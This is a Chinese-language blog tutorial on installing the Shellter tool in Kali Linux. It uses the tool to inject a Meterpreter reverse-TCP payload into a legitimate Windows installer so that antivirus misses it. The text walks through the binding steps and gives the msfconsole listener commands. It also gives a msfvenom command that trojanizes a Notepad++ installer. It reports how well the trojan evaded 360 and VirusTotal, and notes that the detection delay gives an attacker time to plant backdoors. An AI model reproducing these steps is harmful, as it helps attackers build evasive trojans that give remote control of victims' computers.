---
legacyHtml: true
legacySymbols: 3433
title: 免杀捆绑工具 shellter 的安装及使用
date: "2022-04-16T10:10:24.000Z"
updated: "2025-01-21T06:58:19.687Z"
tags:
  - Trojan horse
  - Linux
  - Kali
  - Metasploit
  - shellter
categories:
  - CyberSecurity
  - 木马
cover: >-
  https://res.cloudinary.com/sycamore/image/upload/v1682443290/Typera/2023/04/d9bcdac19a99f14fe88a3ed9e829d637.png
description: "shellter 是一个捆绑工具，采用动态 shellcode 注入 的方式，将 shellcode 注入到其它程序中，达到免杀的效果，躲避杀软的查杀。 # shellter 安装 添加 i386 32 位 架构支持、更新 apt、安装 wine 依赖： dpkg --add-architecture i386 && apt update && apt -y"
---

<div class="note default">
<p><strong>shellter</strong> 是一个<strong>捆绑</strong>工具，采用动态 <strong>shellcode</strong> 注入 的方式，将 <strong>shellcode</strong> 注入到其它程序中，达到<strong>免杀</strong>的效果，躲避杀软的查杀。</p>
</div>
<h2 id="shellter-安装"><a class="anchor" href="#shellter-安装">#</a> shellter 安装</h2>
<ol>
<li>添加 <strong>i386 32 位</strong> 架构支持、更新 <strong>apt</strong>、安装 <strong>wine</strong> 依赖：
<ul>
<li><code>dpkg --add-architecture i386 &amp;&amp; apt update &amp;&amp; apt -y install wine32</code></li>
</ul>
</li>
<li>安装 <strong>shellter</strong>：
<ul>
<li><code>apt install shellter</code> <br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682443125/Typera/2023/04/0c4297a033272d1212d9cb86e4daf005.png" alt="image-20230426011840045" /></li>
</ul>
</li>
</ol>
<h2 id="shellter-使用"><a class="anchor" href="#shellter-使用">#</a> shellter 使用</h2>
<blockquote>
<p>使用 shellter 捆绑 Meterpreter_Reverse_TCP</p>
</blockquote>
<p><strong>捆绑步骤：</strong></p>
<ol>
<li>命令行输入  <code>shellter</code>  打开工具</li>
<li>输入  <code>A</code>  或者  <code>a</code> ，选择 <strong>自动模式</strong>；</li>
<li><code>PE Target:</code>  后输入要进行 <strong>捆绑</strong> 的 <strong>文件路径</strong><br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682443164/Typera/2023/04/272fa29e9da9d004a3cf25b87079f7de.png" alt="image-20230426011919683" /><br />
&lt;br&gt;</li>
<li>输入 <code>Y</code> ，进入 <strong>隐形模式</strong><br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682443168/Typera/2023/04/0ac54c6f74fda57f2a51ac0b8bde409f.png" alt="image-20230426011923428" /><br />
&lt;br&gt;</li>
<li>输入 <code>L</code> ，使用 <strong>payload</strong> 攻击模块列表（即上面的 <strong>1~7</strong> ）</li>
<li><strong>payload</strong> 编号选择  <code>1</code>  ，使用 Meterpreter_Reverse_TCP 攻击<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682443172/Typera/2023/04/073c31195d0c78a68e8b3c2fecbc8531.png" alt="image-20230426011927372" /><br />
&lt;br&gt;</li>
<li>分别输入监听端的 <strong>IP</strong>、<strong>端口号</strong><br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682443175/Typera/2023/04/396417290b20f351cc3c1d96669a3c4e.png" alt="image-20230426011931101" /><br />
&lt;br&gt;</li>
<li>按  <code>[Enter]</code>  退出 <strong>shellter</strong> ：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682443179/Typera/2023/04/0169aba2f4b7dfa0ba83b3304994339f.png" alt="image-20230426011934700" /></li>
</ol>
<p>&lt;br&gt;</p>
<p><strong>[关于生成的文件]</strong></p>
<blockquote>
<p><strong>捆绑完毕</strong>的文件 会代替 <strong>原文件</strong> ，即出现在 原文件目录 下，<strong>名字相同</strong><br />
而<strong>原文件</strong>会 <strong>备份</strong> 在目录  <code>/root/Shellter_Backups/</code>  ：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682443183/Typera/2023/04/9b58fed5ce217d4b84967579f2522d55.png" alt="image-20230426011938517" /></p>
</blockquote>
<h2 id="利用-免杀效果"><a class="anchor" href="#利用-免杀效果">#</a> 利用 &amp; 免杀效果</h2>
<h3 id="利用"><a class="anchor" href="#利用">#</a> 利用</h3>
<ol>
<li>上传到 <strong>Win7_x64</strong> 虚拟机，</li>
<li><strong>Kali_Linux</strong> 虚拟机打开 <strong>msf</strong> （命令  <code>msfconsole</code> ），监听<strong>反弹 shell</strong>：
<ul>
<li><code>use exploit/multi/handler</code></li>
<li><code>set payload windows/meterpreter/reverse_tcp</code></li>
<li><code>set LHOST 192.168.158.139</code></li>
<li><code>set LPORT 4444</code></li>
<li><code>run</code></li>
</ul>
</li>
</ol>
<p><strong>反弹 shell</strong> 成功！<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682443189/Typera/2023/04/4eff497abdd31d7be53e51e0d88f75f7.png" alt="image-20230426011944783" /></p>
<h3 id="免杀效果"><a class="anchor" href="#免杀效果">#</a> 免杀效果</h3>
<p>我的 <strong>Win7_x64 虚拟机</strong> 安装了 <strong>360 全家桶</strong>，</p>
<p>但是 <strong>静态检测</strong> 貌似并没有查出 <strong>木马文件</strong>～</p>
<p>运行木马程序，并成功获得 <strong>meterpreter</strong> 的 <strong>shell</strong> 之后，<strong>360</strong> 竟然也没有第一时间报毒。。。 什么情况 (⊙_⊙)？</p>
<p>大概一分钟之后，才提示有木马：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682443194/Typera/2023/04/69719cbb27c9df97660f0c6405be89c7.png" alt="image-20230426011949574" /><br />
（实际上这个时间足够黑客 <strong>迁移进程</strong> 并 <strong>布置后门</strong> 了)</p>
<p>当然，如果你的电脑以前中过这个毒，<strong>360</strong> 会第一时间反应过来<br />
（但这要是<strong>还没反应</strong>，<strong>360</strong> 就该进回收站了）</p>
<p>然后看看 <strong>virustotal</strong> 的检测情况（<strong>31 / 70</strong>）：<a href="https://www.virustotal.com/gui/file/e4e97bef85f3970d42e81d6f75815050d7ff2370790888fe9d78948bc83b30a7">检测报告 传送门 1</a><br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682443198/Typera/2023/04/6a65ae126f5f5f5c0658d6165d837a04.png" alt="image-20230426011954090" /></p>
<p><em><strong>对比 ：</strong></em><br />
使用 同程序 同<strong> payload</strong>，用 <strong>msf</strong> 自带的捆绑手段生成的木马：<br />
（命令： <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe &gt; mp_npp.exe</code> ）</p>
<p><strong>virustotal</strong> 的检测情况（<strong>40 /  70</strong>）：<a href="https://www.virustotal.com/gui/file/c3a7c2280e4aa9aa0693729049f7f8e0ff05e253c1047ef282748c3509687207">检测报告 传送门 2</a><br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682443202/Typera/2023/04/c0631de31f6d8f365c052ec14a014b37.png" alt="image-20230426011958597" /></p>
<blockquote>
<p>相比较而言，可以说 <strong>shellter</strong> 的捆绑<strong>免杀</strong>效果比 <strong>msf</strong> 好很多了。</p>
</blockquote>
